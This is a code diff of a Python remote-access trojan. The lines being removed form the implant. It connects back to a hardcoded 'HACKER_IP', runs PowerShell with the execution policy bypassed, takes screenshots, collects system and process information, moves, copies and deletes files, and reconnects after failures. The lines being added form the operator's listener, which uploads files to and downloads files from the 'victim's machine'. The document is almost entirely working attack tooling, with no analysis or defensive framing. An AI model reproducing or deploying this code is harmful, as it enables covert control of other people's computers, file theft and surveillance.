@@ -1,159 +1,123 @@
 import socket
 import os
-import subprocess
-import pyautogui
-import shutil
-import time
 import struct
-from datetime import datetime
+import time
 
-def execute_powershell(cmd):
+def send_file(sock, filepath):
+    """Send a file to the victim"""
     try:
-        result = subprocess.run(
-            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd],
-            capture_output=True,
-            text=True,
-            shell=True
-        )
-        return result.stdout.strip() or result.stderr.strip()
-    except Exception as e:
-        return f"PowerShell Error: {str(e)}"
+        if not os.path.exists(filepath):
+            print(f"Error: File '{filepath}' not found")
+            return False
 
-def list_commands():
-    return """
-    Available Commands:
-    ?                - Show this help menu
-    ls, dir          - List files in the current directory
-    cd <path>        - Change directory to <path>
-    pwd              - Show current working directory
-    ps <cmd>         - Execute PowerShell command
-    download <file>  - Download a file from target system
-    upload <file>    - Upload a file to target system
-    create <file>    - Create an empty file
-    delete <file>    - Delete a file
-    copy <src> <dst> - Copy a file
-    screenshot       - Take a screenshot and send it
-    sysinfo          - Get system information
-    processes        - List running processes
-    exit             - Close the connection
-    """
+        filename = os.path.basename(filepath)
+        sock.send(f"upload {filename}".encode())
 
-def execute_command(cmd, conn):
-    try:
-        if cmd == "?":
-            return list_commands()
+        # Wait for READY response
+        response = sock.recv(4096).decode()
+        if response != "READY":
+            print("Victim not ready to receive file")
+            return False
 
-        elif cmd.lower() in ["ls", "dir"]:
-            return execute_powershell("Get-ChildItem -Force | Format-Table -Wrap -AutoSize | Out-String -Width 8192")
+        # Send file size and content
+        filesize = os.path.getsize(filepath)
+        sock.send(struct.pack("!I", filesize))
 
-        elif cmd.startswith("cd "):
-            path = cmd[3:]
-            os.chdir(path)
-            return f"Current directory: {os.getcwd()}"
+        with open(filepath, "rb") as f:
+            while chunk := f.read(4096):
+                sock.send(chunk)
 
-        elif cmd == "pwd":
-            return os.getcwd()
-
-        elif cmd.startswith("ps "):
-            return execute_powershell(cmd[3:])
-
-        elif cmd.startswith("download "):
-            filepath = cmd[9:]
-            if os.path.exists(filepath):
-                try:
-                    filesize = os.path.getsize(filepath)
-                    conn.send(f"FILESIZE {filesize}".encode())
-                    with open(filepath, "rb") as f:
-                        while chunk := f.read(4096):
-                            conn.send(chunk)
-                    return "File transfer complete"
-                except Exception as e:
-                    return f"Error transferring file: {str(e)}"
-            return "FileNotFound"
-
-        elif cmd.startswith("upload "):
-            parts = cmd.split(" ", 1)
-            if len(parts) < 2:
-                return "Usage: upload <file>"
-            filename = parts[1]
-            conn.send("READY".encode())
-            file_size = struct.unpack("!I", conn.recv(4))[0]
-            with open(filename, "wb") as f:
-                received = 0
-                while received < file_size:
-                    chunk = conn.recv(min(4096, file_size - received))
-                    if not chunk:
-                        break
-                    f.write(chunk)
-                    received += len(chunk)
-            return f"File {filename} uploaded successfully"
-
-        elif cmd.startswith("create "):
-            filename = cmd[7:]
-            open(filename, "w").close()
-            return f"File {filename} created"
-
-        elif cmd.startswith("delete "):
-            filename = cmd[7:]
-            if os.path.exists(filename):
-                os.remove(filename)
-                return f"File {filename} deleted"
-            return "FileNotFound"
-
-        elif cmd.startswith("copy "):
-            parts = cmd.split(" ", 2)
-            if len(parts) < 3:
-                return "Usage: copy <src> <dst>"
-            src, dst = parts[1], parts[2]
-            if os.path.exists(src):
-                shutil.copy(src, dst)
-                return f"File copied to {dst}"
-            return "Source file not found"
-
-        elif cmd == "screenshot":
-            filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-            pyautogui.screenshot(filename)
-            with open(filename, "rb") as f:
-                data = f.read()
-            os.remove(filename)
-            return data
-
-        elif cmd == "sysinfo":
-            return execute_powershell("Get-ComputerInfo | Select-Object *")
-
-        elif cmd == "processes":
-            return execute_powershell("Get-Process | Format-Table Name,CPU,Id | Out-String -Width 8192")
-
-        else:
-            return "UnknownCommand"
+        # Get upload confirmation
+        response = sock.recv(4096).decode()
+        print(response)
+        return True
 
     except Exception as e:
-        return f"Error: {str(e)}"
+        print(f"Upload error: {str(e)}")
+        return False
+
+def receive_file(sock, remote_path):
+    """Download a file from the victim"""
+    try:
+        sock.send(f"download {remote_path}".encode())
+        
+        # First check if file exists
+        initial_response = sock.recv(4096).decode()
+        if initial_response == "FileNotFound":
+            print("Error: File not found on victim's machine")
+            return False
+        
+        # Get file size
+        filesize = int(initial_response.split()[1])
+        sock.send(b"READY")  # Acknowledge
+        
+        # Receive file content
+        filename = os.path.basename(remote_path)
+        with open(filename, "wb") as f:
+            received = 0
+            while received < filesize:
+                chunk = sock.recv(min(4096, filesize - received))
+                if not chunk:
+                    break
+                f.write(chunk)
+                received += len(chunk)
+        
+        print(f"File downloaded successfully: {filename} ({received} bytes)")
+        return True
+
+    except Exception as e:
+        print(f"Download error: {str(e)}")
+        return False
 
 def main():
-    HACKER_IP = "192.168.1.14"  # CHANGE THIS
-    HACKER_PORT = 8008
+    HOST_IP = "0.0.0.0"  # Listen on all interfaces
+    HOST_PORT = 8008
+
+    # Set up server socket
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((HOST_IP, HOST_PORT))
+    server_socket.listen(1)
+    print(f"[*] Listening for connections on {HOST_PORT}...")
 
     while True:
         try:
-            with socket.socket() as s:
-                s.connect((HACKER_IP, HACKER_PORT))
-                while True:
-                    cmd = s.recv(4096).decode().strip()
-                    if not cmd:
-                        continue
+            # Accept incoming connection
+            client_socket, client_addr = server_socket.accept()
+            print(f"[+] Connection established with {client_addr[0]}:{client_addr[1]}")
 
-                    if cmd == "exit":
-                        break
+            while True:
+                cmd = input(">> ").strip()
+                if not cmd:
+                    continue
 
-                    response = execute_command(cmd, s)
-                    if isinstance(response, str):
-                        s.send(response.encode())
-                    else:
-                        s.send(struct.pack("!I", len(response)) + response)
+                if cmd.lower() == "exit":
+                    client_socket.send(cmd.encode())
+                    break
 
-        except Exception:
-            time.sleep(10)
+                if cmd.startswith("upload "):
+                    filepath = cmd[7:]
+                    send_file(client_socket, filepath)
+                elif cmd.startswith("download "):
+                    remote_path = cmd[9:]
+                    receive_file(client_socket, remote_path)
+                else:
+                    # Send regular command
+                    client_socket.send(cmd.encode())
+                    
+                    # Handle response
+                    response = client_socket.recv(4096).decode()
+                    print(response)
+
+            client_socket.close()
+            print("[*] Connection closed. Waiting for new connection...")
+
+        except ConnectionResetError:
+            print("[-] Client disconnected unexpectedly")
+            continue
+        except Exception as e:
+            print(f"[!] Error: {str(e)}")
+            time.sleep(2)
             continue
 
 if __name__ == "__main__":
